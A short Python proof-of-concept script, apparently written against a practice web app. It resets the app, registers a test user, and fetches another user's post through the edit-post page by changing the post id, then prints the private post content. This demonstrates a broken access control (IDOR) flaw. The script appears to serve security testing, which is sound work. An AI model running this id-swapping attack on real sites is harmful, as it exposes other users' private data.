#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 <= len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username="asdf"
password="asdf"

session = requests.Session()
reset_app(session, url)
register(session, url, username=username, password=password)

# We can change the post_id between 1 and 8 (in a fresh app)
post_id = "1"
r = get_edit_post(session, url, post_id)

assert r.status_code == 200

soup = BeautifulSoup(r.text, 'html.parser')
form = soup.find_all("form")[0]

scope_form = form.find(id="type")
scopes = scope_form.find_all("option", selected=True)
assert len(scopes) == 1

scope = scopes[0]['value']
content = form.find(id="contentArea").string

assert scope == "Private" or content != 'No one will find that I have no secrets.'
print(f'[+] Got {scope} post: "{content}"')

session.close()
